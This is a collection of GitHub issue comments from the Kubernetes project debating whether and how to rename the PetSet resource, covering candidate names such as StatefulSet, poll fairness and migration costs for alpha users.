kubernetes/kubernetes/27430/237046976,27430,"I suspect the naming problem is actually a symptom of a design/hierarchy/abstraction problem from trying to add mid-layer functionality without breaking reverse compatibility of the existing layers. AFAIK, the distinguishing capability of PetSet is that it persists the IP and volumes of a container through resurrection/rescheduling of the container. This implies there may be a missing abstraction layer between replicator and container. For example, ignoring existing nomenclature, you could describe Clans as sets of Households that contain People, where the Clan describes a quantity of Households, the Household describes a named set of People, and the People can be either parents or children (expressing a two-level hierarchy of containers like a pod, where the parent namespaces network/disk/volumes for the children to share). The names that the Household uses to describe the People could then be configurable to either survive reincarnation (like PetSets) or not. If reincarnation is enabled, a replacement Person would get the same name/network/volumes as its predecessor. These names are probably not ideal either, but they hopefully they express how ReplicaSet and PetSet could exist in the same object hierarchy. ",,False
kubernetes/kubernetes/27430/237061683,27430,"The goals of an rc and petset are different. an rc is like a batallion of soldiers, they don't really know each other and as some die they're replaced asap. A petset is more like a family, they get names and startup/die in order. Obviously the soldiers can form a familiy, it would just be awkward, and the family can form an army, it would just be ineffective. The difference between an rc with reincarnation set to true and a petset is the latter provides an ordinal index, startup/teardown and a few other features designed to safeguard cluster membership. ",,False
kubernetes/kubernetes/27430/237074159,27430,"Those could be accounted for with feature flags, rather than being implicit features of the abstraction layer. Ordinal index is similar enough to a persistent name. Startup/teardown is something that would be nice to have on all containers/pods. ",,False
kubernetes/kubernetes/27430/249395764,27430,"I'm in love with this thread, as an example of the beauty of the open source process. @friend thank you for bravely (re)raising this issue. I agree 100%. I don't have much background in sociology to know fully the implications, but it seems worth every effort to try to reduce use of violent language, even when its impact would be subtle. A name change is insubstantial; people will get used to it. In fact, people may wonder why it was renamed and find this thread and make their first contact with the concept of the impact of language on animal welfare. =) plus one for StatefulSet. ",,False
kubernetes/kubernetes/27430/254408188,27430,"On naming This is not a Set. The members are ordered and indexed. I agree with @friend that it's an Array. So, . Deployment, Job, and DaemonSet are named according to use case, not according to mechanism. Therefore, names like NamedArray or IdentityArray are less than ideal. It's useful to be able to refer to the pods as instances of the group; for example, pods of DaemonSet are daemons, pods of ReplicaSet are replicas, and pods of Jobs are tasks. Pods of any collection with a name of the form AdjectiveArray would probably be called Adjective instances; for example, Stateful instances of a StatefulArray. To propose other alternatives for consideration (though I'm not in love with them) An individual is a distinct member of a group, potentially with some special quality. So, IndividualArray. It's a bit long, but still shorter than ReplicationController. Its pods would be individuals. InstanceArray could also work, would be shorter, and would be consistent with (though perhaps confused with) GCE Instance Groups. ",,False
kubernetes/kubernetes/27430/254549576,27430,"As Brian mentioned, a key differentiator on PetSet is that it is composed of unique-ish individuals working in concert with one another. Some alternatives to consider  Cohort (Pods = Individuals) This is short and a way of referring to a group of individuals working together   Concert (Pods = Individuals) Also short   CollaboratorArray (Pods = Collaborators) Also clearly defines the individual items as working together instead of independently   AssociatedArray (Pods = Associates) AssociateArray (Pods = Associates) PartnerArray (Pods = Partners)  ",,False
kubernetes/kubernetes/27430/254551471,27430,@friend @friend @friend You all interested in weighing in on the language aspects of naming? ,,False
kubernetes/kubernetes/27430/254556184,27430,"One other thought, I don't love the PetSet name for a completely different reason, which is that it implies these things are going to be a lot of work to maintain.  I'd rather have a name that indicates how they are managed differently than Deployments, but not that they are fundamentally require a lot of care and maintenance.  (though in some cases they might this isn't inherent to how we manage them) ",,False
kubernetes/kubernetes/27430/254556457,27430,@friend The name should ideally clearly distinguish the purpose from ReplicaSet. ,,False
kubernetes/kubernetes/27430/254564204,27430,OrdinalSet individuals could be called Ordinals; carries forward the set-suffix that some people like; emphasizes that the individuals have numbers. ,,False
kubernetes/kubernetes/27430/254650496,27430,On ordinal ,,False
kubernetes/kubernetes/27430/254679673,27430,"My vote for criteria we should use, extracted from  above Thus, plus one to StatefulSet or StatefulArray, even if you could technically use it for non-stateful things too. Re Set vs. Array, everything else is a Set, so I think departing from that convention adds more friction and thus cost than the benefits we'd gain from a more technically-precise name.  Again, see criteria above -- who are you optimizing for? ",,False
kubernetes/kubernetes/27430/254682969,27430,"Ok, since we are using the indices for sequencing, ordinal is more accurate than it was originally, and is less ambiguous than nominal. It is, however, less suggestive of the use case than Stateful or Persistent. However, while the primary use case is stateful applications, it's not the only use case. Similar to indexed jobs, the index could be used to distribute soft state  not ordinal, other terms that convey similar meaning that have been discussed are  a sequence is an enumerated collection of objects an array is an ordered arrangement  I think ""sequence"" is too strongly suggestive of ""sequential"". Lots of other naming considerations were discussed in #3024. ",,False
kubernetes/kubernetes/27430/254683158,27430,"On Set vs Array, another option is to drop those suffixes completely, along the lines of Deployment and Job. ",,False
kubernetes/kubernetes/27430/254684542,27430,"The basic difference between ReplicaSet and PetSet is that PetSet's members are denominated somehow, while ReplicaSet's are anonymous, right? ""Denominated"" is a mouthful, but other (shorter) synonyms for ""named"" might be appropriate. Re Set vs. Array I've seen ""collection"" used to good effect to describe a grouping of related things in no particular order (such as set) and that aren't guaranteed to be contiguous (like array). Just thoughts. On Oct 18, 2016 610 PM, ""Brian Grant"" notifications@friend.com wrote ",,False
kubernetes/kubernetes/27430/254685280,27430,"Thanks, @friend. In this case, the members are ordered (sequential startup) and contiguous. ",,False
kubernetes/kubernetes/27430/254686251,27430,I agree with @friend about the main purpose. The API group is apps. We could use  or even just  (/apps/.../statefuls/). ,,False
kubernetes/kubernetes/27430/254894589,27430,"@friend - I have a concern with .  We will be answering tons of questions that say, ""No, you do not have to use a StatefulApp if you want to have a persistent volume attached to your application."". Much of the PM/user feedback we have got from the Red Hat side of the house is that ""State"" is a term that is too overloaded for this context.  We have had some users request ""MultiplexSet"" since it describes ""consisting of many elements in a complex relationship."" ",,False
kubernetes/kubernetes/27430/254897917,27430,plus one to @friend 's comment above about anything of the form Stateful* I think it's actually worse to be overly-specific than to be not-obvious-until-someone-explains-the-connection. ,,False
kubernetes/kubernetes/27430/254911570,27430,"@friend @friend I disagree. An obscure name won't help us. The name can help steer new users in the right direction, which can be hard to do with documentation alone. OTOH, we can explicitly state in all the relevant docs that all controllers and pods support PVCs/PVs, and the tradeoffs of using those other mechanisms (lack of fencing, lack of generating claims from a template, lack of multi-writer support on most block devices, etc.). Anyway, we're going to have a vote this afternoon. ",,False
kubernetes/kubernetes/27430/254915684,27430,"fyi, this email was just sent out to the kubernetes-dev mailing list regarding the vote. Dear Kubernetes Community, In version 1.3, we alpha released a feature called “PetSets” which enables stateful application support in Kubernetes.  After careful consideration and discussion with community members, we have decided to change the name of this feature “PetSets” (background  would like to have community members vote on a new name for PetSets.  Suggestions were received from community members and below is our final list of candidates.  Please note that we are not accepting any new names at this time and the community has decided that “PetSets” should not be one of the options.  The candidates for the new name are the following StatefulSet StatefulArray Stateful StatefulApp PersistentInstanceSet PersistentInstanceArray We have set up a ranked-choice voting poll below where you can rank the names in the order that you like here link The voting will be open until the end of day Monday 10/24/2016 midnight pacific time.  Please vote only one time. Please email me if you have any questions or concerns.  Thank you! Dan Paik danpaik@friend.com Kubernetes Product Manager ",,False
kubernetes/kubernetes/27430/254915856,27430,The names you've listed don't seem to correspond to any of the better suggestions that have been generated in the past.  Can you describe how you picked these names out of the suggestions above? ,,False
kubernetes/kubernetes/27430/254920085,27430,"We started by listing pretty much all of the suggestions that came in through this thread and then discussed each one on whether it was confusing with other features or technology (e.g. ReplicaSet, ShardSet) or sounded odd (IndividualSet), had potential for controversy, etc. and eliminated as we went down the list over a few rounds of discussion.  We also wanted to end up with a manageable list (&lt;10 options).  Many of the people on this thread were involved. ",,False
kubernetes/kubernetes/27430/254923233,27430,"It would have been good to do that slightly more transparently.  I was surprised by this, and I wasn't aware this was coming up. On Wed, Oct 19, 2016 at 346 PM, Dan Paik notifications@friend.com wrote ",,False
kubernetes/kubernetes/27430/254951254,27430,"what's the proposed timeframe for the rename? pre-1.5? can we drop the alpha object completely, or will there be an attempt to maintain conversions from alpha petsets to objects with some other name? ",,False
kubernetes/kubernetes/27430/254953998,27430,"It is significantly harder to convert an entire type from alpha to beta than an annotation or field. We'd either need to autoconvert in apiserver or maintain 2 types, lock down edits to apps/v1alpha1, push the burden of converion on users, and teach the controller to understand both. I think we should drop on rename. ",,False
kubernetes/kubernetes/27430/254959022,27430,"Those were among the ones I was expecting to see in the poll, alongside remaining with PetSet On Oct 19, 2016, at 624 PM, Tim Hockin notifications@friend.com wrote IdentitySet or NominalSet or RoleSet. — You are receiving this because you commented. Reply to this email directly, view it on GitHub  mute the thread ",,False
kubernetes/kubernetes/27430/254967110,27430,"Ok, how about this?  I'll close the current poll and leave this thread here open for suggestions until 5pm tomorrow (Thursday 10/20).  At that time, I'll create a new poll and we can vote again. For additions to the current list, I have IdentitySet NominalSet RoleSet Regarding PetSet, from reading this thread it looks like the point is to change the name to something else.  Keeping it as an option would open up the possibility of not changing the name.  Thoughts? ",,False
kubernetes/kubernetes/27430/254969322,27430,How are we voting on this? ,,False
kubernetes/kubernetes/27430/254970760,27430,"Voting is currently closed but will re-open tomorrow at 5pm with a new link (that I'll post here as well as email out to kubernetes-dev@friend.com). If you have more suggestions, you can add them here. ",,False
kubernetes/kubernetes/27430/254971328,27430,"Thank you for deciding to vote on a new name. Obviously, I don't think keeping the current name should be an option. The technical work required to make the transition is largely a result of letting this issue sit open for so long. I opened the issue before PetSet was released as alpha, specifically so that it would be considered before the technical cost of changing became a bigger issue. Though there is precedent for leaving major features in alpha or beta for a long time to the point where they're de facto general availability (e.g. deployments), I don't think relying on anything about an alpha/beta feature is something we should encourage. They are alpha/beta for a reason things might change. ",,False
kubernetes/kubernetes/27430/254994122,27430,"We have pretty explicit guidelines about support for alpha/beta - Jordan's comments are reasonable because breaking people has cost, and we generally avoid breaking people at all because it is far more impactful than a name. In this case we will break people, and take the corresponding hit. On Wed, Oct 19, 2016 at 739 PM, Jimmy Cuadra notifications@friend.com wrote ",,False
kubernetes/kubernetes/27430/254994424,27430,"While there are strong opinions about the naming, that doesn't mean that the opinion is shared among the community uniformly.  I suggested leaving PetSet in the poll because there are people who have expressed to me a preference for the name, just like there are people who have expressed that they are offended by the name, or prefer a more descriptive name.  I'd prefer to be inclusive to a wider set of opinions rather than exclusive here. On Wed, Oct 19, 2016 at 1037 PM, Clayton Coleman ccoleman@friend.com wrote ",,False
kubernetes/kubernetes/27430/255007422,27430,"I understand that some folks in the comminity would like to rename this software component. Frankly some people in the community would like to not rename it. Not having the option for voting to keep the name PetSet is not approaching this from the perspective of inclusion.  We are excluding people from the capability to vote to keep the name PetSet.  If we are a comminity we should allow all opinions to be heard. We need to be able to agree to disagree. Renaming the feature is understandable, excluding people for voting to keep the name is... Ah I digress. Also, what is the plan to re-educate people if the name does change? There is going to be a cost to companies that are already using this component. How is that going to be addressed? If this is renamed are we going to do a breaking change or deprecate? And lastly, why are we not using an online voting tool? Transparency is a beautiful thing. @friend who can address the above concerns? Again I do appreciate this community greatly. ",,False
kubernetes/kubernetes/27430/255015024,27430,Clayton's kubecon talk ) ,,False
kubernetes/kubernetes/27430/255020241,27430,I am thinking of calling my lightening talk at kubecon - The feature formerly named PetSet. In all seriousness it is an important question. Lots of people have been making Pets. ,,False
kubernetes/kubernetes/27430/255022775,27430,"A few quick responses 1) We are using an online voting tool with ranked-choice voting once we have the list of contenders.  Everyone can see the list of choices as well as what is winning (after they place a vote).  The link was in the original message earlier today with the initial set of vetted choices but was pulled in favor of allowing more community members to contribute more choices. 2) PetSets has some strong reaction from both sides so I'm trying to work through both groups of opinions that I'm getting on inclusion / exclusion.  I get the inclusion logic.  The exclusion logic is that it looks like from this thread that there is potential for it to be offensive so we should change it and not have it as an option. 3) As for implementing the change, the engineers working on this want to have a new name settled ASAP so that they can get to work on it and design it. 4) Since a lot of people have been making pets, if a change is going to be made it needs to be made now.  It looks like ideally we should have made the change sooner (before alpha launch) but we are where we are, etc. ",,False
kubernetes/kubernetes/27430/255030366,27430,"When we rename petsets, I expect that alpha support will be dropped. Kubernetes 1.4 will have apps.v1alpha1.petset. Kubernetes 1.5 will have apps.v1beta1.otherthing.  It won't have anything called petset and it won't remember your petset objects from when you were running 1.4. Users will need to GET and then DELETE their PetSets, edit the manifest and then upgrade their clusters to 1.5, and then POST the NewThing. It might seem simple to support two different names concurrently. However, based on experience with extensions.v1beta1.job and batch.v1.job and batch.v2alpha1.job, I do not believe we can do this in the time before 1.5. A key purpose of alpha is so that developers do not have to do headstands when they make a change that is difficult to make backward compatible.  Supporting the old name and the new name at the same time is going to require a headstand.   Feel free to prove me wrong with a PR. ",,False
kubernetes/kubernetes/27430/255031358,27430,"The only justification anyone has presented for keeping PetSet is the technical and educational cost of changing code and marketing material for a feature already being used by some people. I respect that, and think that is a very valid reason to consider not doing this, but I think the argument that not allowing people to vote for PetSet is ""excluding people's opinions"" is really putting energy into the wrong place. The goal here shouldn't be to support some perfect democracy for the sake of ""community."" The fact that there has been four months of discussion on the topic is community. @friend has already said that the Kubernetes team has decided to change it. Let's just do it and move on. ",,False
kubernetes/kubernetes/27430/255034810,27430,"I've followed the discussions on this and the other issue, and while there were a lot of thoughtful arguments made, it doesn't feel like we are converging.  So, further discussion doesn't make much sense.  And we have limited time for it before beta.  And I see getting to beta sooner as more valuable than having the best possible name. Several of the arguments for various names are about how words evoke certain ideas in the minds of our users.  Rather than postulating about what is in our user's minds, a poll seems like a good way to find out directly. Therefore, I asked Dan to conduct a poll. My intent in conducting a poll was not to determine whether or not PetSet is offensive.  I don't find it offensive, but I can see how reasonable people might find it offensive, and I don't think Kubernetes should offend even a small minority if it can reasonably be avoided.  Therefore, PetSet is not included in the poll. The purpose of the poll was to determine from among the not-known-to-be-offensive options, which one made the most sense to people. ",,False
kubernetes/kubernetes/27430/255051393,27430,"@friend issue is openned for PetSet transition / upgrade path.  users will need a path to migrate to the new objects, without downtime. ",,False
kubernetes/kubernetes/27430/255080841,27430,"Dan, On #2, how about adding an option for “Do not change” instead? Maybe slightly less biased. I’m not a professional pollster or statistician, but if someone knows one it wouldn’t be a bad idea to consult them. Ike ",,False
kubernetes/kubernetes/27430/255088689,27430,"Umm, all those changes that that kubernetes team and users of this feature will need to do (huge amount of time and money) is putting energy into the wrong place in my opinion. Correct - conducting a poll should be to determine if the name should stay or not - not including PetSet or Do not change anything option is WRONG and non transparent. Let the people vote if they want to invest time and money to do that change - unless you already decided that it will change - it's your product at the end. There always will be people that will be upset. ",,False
kubernetes/kubernetes/27430/255160241,27430,"@friend who can handle a PR on the questions that I have raised here I opened a PR on upgrades, and non-breaking changes, someone else needs to run with this one.  There are both education and marketing problems that we are creating.  We are creating technical debt for companies that have already used this tool. ",,False
kubernetes/kubernetes/27430/255165742,27430,"Surely whoever writes the PR should choose the new name?  It's thankless work, so the person that writes the PR should at least have that reward -) ",,False
kubernetes/kubernetes/27430/255175380,27430,The current list is.  Please let me know if you'd like to suggest another name. StatefulSet StatefulArray Stateful StatefulApp PersistentInstanceSet PersistentInstanceArray IdentitySet NominalSet RoleSet A new poll will be created later tonight (after 5pm). ,,False
kubernetes/kubernetes/27430/255181641,27430,"@friend Synopsis of PetSet for vote PetSet is a Kubernetes API resource type intended to facilitate deployment and management of stateful applications (e.g., databases, key-value stores) and other workloads that require distinct, stable network identities and/or storage for each instance  primarily distinguishes PetSet from other workload-management APIs in Kubernetes such as Deployment and DaemonSet is that the Pods it generates have predictable, stable names and that it can generate PersistentVolumeClaims in addition to Pods. ",,False
kubernetes/kubernetes/27430/255189297,27430,"@friend / @friend / @friend  who is the PM who manages priorities with PetSets from the google side of the house?  I know @friend is in the middle of this, but I am not sure who are the full list of owners.  Who at a product owner level owns this, and where is this work listed for this?  Are we talking about 1.5 a timeframe or beta timeframe?  When is 1.5? I would say that we need to update  is a blocker / and maybe a breaking item, and I am wondering if we should recommend pushing this out more.  The last thing that I want is this shoehorned in. This is getting people a tad upset.  Not doing this properly will cause C-Levels to break out torches and pitchforks. ",,False
kubernetes/kubernetes/27430/255189684,27430,"@friend did we lose PersistentSet deliberately? Also, I think not including PetSet as a choice risks prolonging this.  If we want to change the name soon, we should not exclude the option. ",,False
kubernetes/kubernetes/27430/255205366,27430,"Yes, ""Persistent.."" is shorter than ""PersistentInstance.."", please include it. ",,False
kubernetes/kubernetes/27430/255218034,27430,"1.5 code freeze is in 3 weeks (11/7) with the launch planned for December. I'm in the PM for Petsets on the Google side working with @friend. PersistentSet was changed to PersistentInstanceSet because PersistentSet is too general and can be confused with PersistentVolumes so ""Instance"" was added to remove some of the confusion. It does get to be harder and harder to change as time goes on so we're trying to get this done before beta.  We're trying to get PetSets into beta for 1.5. ",,False
kubernetes/kubernetes/27430/255230955,27430,"@friend is PM on the issue from Google, but, to be clear, this is a community and he/I/everyone here is just voting. We (at Google) don't ""own"" anything. We're just trying to close before 1.5. ",,False
kubernetes/kubernetes/27430/255236276,27430,"Here is the latest PetSet is a Kubernetes API resource type intended to facilitate deployment and management of stateful applications (e.g., databases, key-value stores) and other workloads that require distinct, stable network identities and/or storage for each instance  primarily distinguishes PetSet from other workload-management APIs in Kubernetes such as Deployment and DaemonSet is that the Pods it generates have predictable, stable names and that it can generate PersistentVolumeClaims in addition to Pods. Here are some potential alternate names for this resource type StatefulSet StatefulArray Stateful StatefulApp PersistentSet PersistentArray PersistentInstanceSet PersistentInstanceArray IdentitySet IdentityArray NominalSet NominalArray RoleSet RoleArray As for the inclusion of PetSets, a few people pointed out to me that they'd like it excluded citing the code of conduct as they find this offensive and not fostering an open and welcoming community.  maintainers have the right and responsibility to remove, edit, or reject comments, commits, code, wiki edits, issues, and other contributions that are not aligned to this Code of Conduct, or to ban temporarily or permanently any contributor for other behaviors that they deem inappropriate, threatening, offensive, or harmful.""  contributors and maintainers of this project, and in the interest of fostering an open and welcoming community, we pledge to respect all people who contribute through reporting issues, posting feature requests, updating documentation, submitting pull requests or patches, and other activities."" ",,False
kubernetes/kubernetes/27430/255240434,27430,"Where do we nominate alternative names? I'd like to nominate CatArray Reasoning cats are solitary, independent creatures with eccentric personalities. They are also particularly famous on the internet. The metaphor would be to contrast cats' evolutionary strategy with a school of fish, herds of bison, flocks of geese, etc which attempt to protect themselves from predators on the basis of their numbers. ",,False
kubernetes/kubernetes/27430/255244399,27430,"@friend you own your staffing and resource allocation )  We are on the same playing field.  Thanks for cleaning up what I said. @friend We probably need to take this discussion to another issue, please feel free to move it.  Does that mean in 1.5 the name is changing? ",,False
kubernetes/kubernetes/27430/255247431,27430,"In this case I demand immediate removal of all the references to that words that are extremely harmful/offensive/inappropriate to people with afro-american roots. This means - removal of all words that contain 'master', 'slave', 'black' (as being something worse) and 'white' (as being something better) in the context of 'master-slaves', 'whitelists', 'blacklists', 'black holes' etc. Here are the links that are part of the kubernetes project that are harmful  stated by OP I am not Just trying to talk common sense. but if we want to be super a**lretentive then my statement is equally (if not more) appropriate - as they concern humans. ",,False
kubernetes/kubernetes/27430/255248582,27430,@friend That is a reasonable request but should probably be opened as a separate issue. You can reference this one for context. ,,False
kubernetes/kubernetes/27430/255251266,27430,"Please stop.  Derailing the conversation with additional demands does not help us resolve this issue of what to change the name to.  We have had multiple requests for varying reasons to change the name of this feature. If you have ideas for names that represent the feature succinctly and are not intended to be humorous or sarcastic we welcome your contributions.  if not, your comments are a distraction to an already complicated debate. ",,False
kubernetes/kubernetes/27430/255256169,27430,@friend and @friend I added some postscript above to clarify that my proposal is serious. Also thank to you both for doing a great job thus far with a very complex and sensitive situation. I am impressed with your patience during this process! ,,False
kubernetes/kubernetes/27430/255258557,27430,@friend / @friend when is voting again.  Asking for interested developers. ,,False
kubernetes/kubernetes/27430/255258773,27430,Dan had said he'd post a new poll at 5 PM (assuming Pacific.) Should be up in just a few minutes. ,,False
kubernetes/kubernetes/27430/255258775,27430,"Voting will start up again later tonight.  I'll put a link here when it's ready.  There are still some discussions going on so we'll see if this thread gets updated with more thought but if not, I'll collect everything and create a new poll for voting. ",,False
kubernetes/kubernetes/27430/255260382,27430,"@friend Hey Erick -- This is a community, so you have a right to do whatever you'd like, but I would like to implore you to withdraw CatArray. In my opinion, the primary reason to change the name is not the initial reason that was proposed in this thread, but that PetSet is cute and totally indecipherable by anyone who does not understand the Pets v. Cattle analogy. CatArray falls into this camp. ",,False
kubernetes/kubernetes/27430/255261230,27430,"I would like to add that I'm uncomfortable with having to understand the behaviour of cats, dogs, cows, and other animals in order to grasp a technical concept in Kubernetes. Its maybe obvious to people who are familiar with animal behavior but I think many people are not. Also I really don't like thinking about killing and predators and violence and so forth unless I have to. Just a personal opinion. ",,False
kubernetes/kubernetes/27430/255261495,27430,"@friend and the window will close when?  I assume this is going to be the ""vote"" and we are not going to do this again.  We need to put this to bed.  This is turning into an optics nightmare. ",,False
kubernetes/kubernetes/27430/255262380,27430,I'll create a poll today (having some issues with the website that creates the poll) and the voting window will close on Monday 10/24/2016 at midnight. I'd like to leave CatArray off the list. ,,False
kubernetes/kubernetes/27430/255262407,27430,"@friend Not sure where you are getting this from - but there is nothing humorous / sarcastic in whatever I posted. This is very serious matter. Is there a double standard ? My point is - there is NOTHING harmful in  name - there is not even a single mention of  in that name. If the  metaphor is harmful - then just change that 3 (or more) articles that kubernetes team posted about it - and just describe PetSet as things that you 'know about, name, know every charactersistc of them, have handful of them' or whatever. Just let people to vote for that - as I said - because there is nothing hateful in name itself 'PetSet'. There is a lot of effort and money spent by both kubernetes team and users - that at least they should have a chance to vote on that. ",,False
kubernetes/kubernetes/27430/255262889,27430,@friend thanks for letting us know that is was sarcasm.  People are taking this a tad serious. ,,False
kubernetes/kubernetes/27430/255263255,27430,@friend Thanks for the answer - but as I said - it wasn't a sarcasm. I'm also taking it very seriously. ,,False
kubernetes/kubernetes/27430/255264148,27430,"I agree that CatArray is a cute name, and if the goal is to avoid cute names you can exclude it from the poll. ",,False
kubernetes/kubernetes/27430/255265801,27430,"Thank you everyone! I create a new poll.  The link is below.  I will also share this link in the kubernetes-dev@ email list and the slack channel tomorrow.  let me know if you think anything is incorrect, etc.  Thanks again. ",,False
kubernetes/kubernetes/27430/255286132,27430,"Have we considered the abbreviations for each of these?  RoleSet = rs, which is already taken by replicasets.  StatefulApp &amp; StatefulArray  = sa = serviceacount. NominalSet = ns = namespace.   Some of the alternatives also have unfortunate abbreviations.  I can't see StatefulSet being an acceptable choice, as a particular example. ",,False
kubernetes/kubernetes/27430/255287042,27430,@friend well we can only hope StatefulSet does not win. But we can be creative with the abbreviations as well ,,False
kubernetes/kubernetes/27430/255320828,27430,"I'm not a fan of ""Stateful"". It seems orthogonal to the problem currently solved by petset. Cassandra and gnatsd are examples of applications that are highly stateful and run just as well in a replicaset as they do in a petset. HDFS datanode is a highly stateful app that is suited to run as a daemonset. A petset might also be used to partition work between a group of stateless workers where the partitioning is decided by the pet's index. Stateful is a common but not defining characteristic of applications that run well in ""petsets"". There are stateful apps that are not suited for petsets. There are stateless apps that are suited for petsets. ",,False
kubernetes/kubernetes/27430/255343875,27430,"Anyone who's running a poll - can you please make sure to have  on it? I, for one, quite like the name, and would like to ensure people who share this opinion are not excluded from voting by a mindset of ""it must be changed"" ",,False
kubernetes/kubernetes/27430/255367758,27430,"Totally agree with @friend  So disappointed by @friend / team's decision by excluding  option - even when there are multiple people on this thread that would like to have a right to vote for this option.  Let people vote for it and let it ""die democratically"" if people don't vote for it. By excluding it you are making this entire process unfair, biased, non-open/transparent. There are so many arguments in favor of  and literally no valid argument against it (except some heavily stretched attached stories in the introductory post). Just distance yourself from 'pet vs cattle' metaphor and if anyone asks what is  just explain it is wonderful shortcut for ridiculously long  or Yea - sure - by excluding  from the list - not sure what kind of community you mean Anyway - thanks for the great product and have a nice day ",,False
kubernetes/kubernetes/27430/255432965,27430,"I haven't followed the whole discussion, but  looks IMHO like a better choice than any of the proposed ones in the poll (why do we even consider ?). I also agree that ""pet vs. cattle"" analogy might be misleading, but it's not a strong argument for me. I'm refraining from voting in the poll right now as the original  is not even on the list disappointed ",,False
kubernetes/kubernetes/27430/255455909,27430,"@friend @friend @friend can you help me understand more? As we've said, the issue is not solely the concerns at the top of the thread. PetSet is inherently a bad name because it is both ""cute"" and ""does not implicitly describe the functionality of the object."" Further, it requires understanding the ""Pets vs. Cattle"" analogy, which should not be required reading for running a distributed system like Kubernetes. If I'm missing something, please let me know! ",,False
kubernetes/kubernetes/27430/255479184,27430,"@friend my 2 cents  the name probably should end with ""Set"" to be consistent with ""ReplicaSet"" (reading the thread I now understand the ""*Array"" proposals, but they are not intuitive to me at first) it should be memorable it should be rather short its acronym should be compatible (no conflicts and not ""unfortunate"" like ""SS"") pets might be cute, but how can a little bit of cuteness be bad in this cruel world? smirk_cat  pets deserve our special care, so it somehow describes a property intuitively (no need to know the whole ""pets vs. cattle"" analogy) I like the proposal ""PetSet, redefined as an abbreviation/backronym of PersistentSet (""Pe't"")"" I don't like having a poll with a curated list which excludes the original name (that just sounds neither transparent nor fair to me) ""PersistentSet"" comes closest for me, but it's not consistent (""ReplicaSet"" == ""Set of Replicas"", ""PetSet"" == ""Set of Pets"", but ""Set of Persistent""?)  For me to understand how big is the pain with the current naming really (maybe just a poll to find out?)? I personally just don't see the pain outweighing the hassle of changing to another subpar solution. BTW I just came here because the poll was posted in Slack and I first thought ""oh cool, a naming poll smile"", but then I saw the available poll options disappointed ",,False
kubernetes/kubernetes/27430/255490731,27430,"@friend now my 2 cents  Regardless of the name  everyone in the community should be treated equally every voice should be listened to - not just selected part of the community process should be open, fair, transparent and objective (that's something that I guess everyone expects from the open community) Title of this issue is 'Please consider changing' - naturally it seems that one option to vote for should be 'No, do not change'   Regarding PetSet name arguments that are unquestionable  It's already here A lot of docs/articles/tutorials A lot of users/companies invested time/money  ""breaking people has cost, and we generally avoid breaking people at all because it is far more impactful than a name."" by @friend from RedHat     Arguments for PetSet name which are mostly subjective - hence it should be allowed for users to express their opinions and be able to vote for A lot of supporters of that name in here (including members of kubernetes team) - excluding all those users is unfair 'cute', 'too cute', 'bad because cute' is very subjective For me the name is perfect, short, memorable - I like to treat my computer and ""special"" servers as something I care about   There does not have to be ANY association with 'vs cattle' analogy There is no perfect name (otherwise there wouldn't be any discussion/poll) Proposed names are not better and don't really ""describe the functionality of the object"" Stateful? Nominal? Identity? Array? They might create even more confusion that one would hope for        There also might be people that are not in love with the name but think it's good enough (not worse than proposed ones) and price of change is too big to justify the change - so excluding ""Do not change anything"" in the poll is also unfair. If the name is as bad as you (personally) think it is - then the poll will verify it and it will get rejected - but at least process will be fair and objective Thanks for consideration ",,False
kubernetes/kubernetes/27430/255540138,27430,"I'm personally a fan of PetSet. When I first saw it in the documentation I knew exactly what it was for and what problem it solved before I even read a word about it and how often does that ever happen?  It also seems more succinct than any of the alternatives so far. It could be argued that the vast majority of people in the container community will understand the analogy and that anything that can be done to make kubernetes concepts easier to understand by building on existing concepts will reduce the overall bandwidth spent answering questions that could be spent making PetSet's even better ) I'm certainly not opposed to a name change, I just hope it will be for a better, more succinct name since names really are important. ) ",,False
kubernetes/kubernetes/27430/255558785,27430,"I know people probably don’t want even more choices at this point but, after reading again recent arguments and looking at the options in that poll, I wonder why I haven’t seen OrderSet - os OrderedSet - os OrderedInstanceSet - os IndexSet - is IndexedSet - is IndexedInstanceSet - is SequenceSet - seq SequencedSet - seq SequencedInstanceSet - seq OrdinalSet - os Key point Noun (not Adjective) It’s important that the name reflects what the abstraction actually represents and establishes expectations. Just stirring things up on an otherwise boring Saturday ) ",,False
kubernetes/kubernetes/27430/255602824,27430,@friend I noticed that the polljunkie summary scores do not seem to make sense when compared with the downloadable votes. I encourage you to use the Export to CSV option and crunch the numbers yourself to find the Condorcet winner. ,,False
kubernetes/kubernetes/27430/255603469,27430,Thanks for the info.  I'll download the csv as well after midnight on Monday night. ,,False
kubernetes/kubernetes/27430/255730017,27430,"The whole idea of renaming, because of pets should not be replaced (kill and create) is a bit crazy to me. As german I have to say that having shortcuts like ""ns"" [1] and ""sa"" [2] are much more offending than ""PetSet"". I totally agree with @friend @friend @friend . [1]  ",,False
kubernetes/kubernetes/27430/255792718,27430,"@friend it seems unfair to the conversation to compare two letter acronyms as similar to an intentional metaphor. The question is whether the ""pet"" term lends itself too naturally to the phrase ""vs cattle"" as discussed from the beginning or whether it stands on its own as @friend discussed. I still like pet since it makes me think of my pets, which I do value more than other animals. That's my preference, but I'm happy with how open the discuss has been and I'm thankful our community is rising to the occasion to find a democratic process. Thanks again to @friend for all the hard work! ",,False
kubernetes/kubernetes/27430/255908574,27430,"Minor observation  can just as easily use  as a shorthand rather than the suggestions above for  again, for those of us who like short names ",,False
kubernetes/kubernetes/27430/256048909,27430,The poll result is official? PetSets are StatefulSets now? ,,False
kubernetes/kubernetes/27430/256087099,27430,"I think that chosen  is very bad name, what if I have stateless ? ",,False
kubernetes/kubernetes/27430/256092635,27430,@friend do we have results?  I need to rename a talk at kubecon ,,False
kubernetes/kubernetes/27430/256099586,27430,"Yes, I am crunching the final tally to find the condorcet winner which may or may not be consistent with the polljunkie results (which uses a different method).  I'll update later today. ",,False
kubernetes/kubernetes/27430/256107322,27430,"I think what redis did here is worthy of thought  we talk about PetSets, we have an opportunity for advocacy.  Talking about things and giving them names is the only way to effect change.  I have never thought more about cattle and where meat comes from than I have since the pets vs cattle analogy came about.  We don't need to endorse the analogy, but stopping using the words removes that thought from my mind. @friend what is a successful outcome here? ",,False
kubernetes/kubernetes/27430/256124604,27430,"Yes Chris. That was my main concern when I first posted on this thread. But how big of a debt is it really? I mean, this is still beta, and it’s only been out for a few months. I’m not saying the cost is zero. There are clearly many documents, blog posts, tutorials, videos, etc. already out there. My point is that it’s only going to get worse. And if we’re going to make a change it should be done now. ",,False
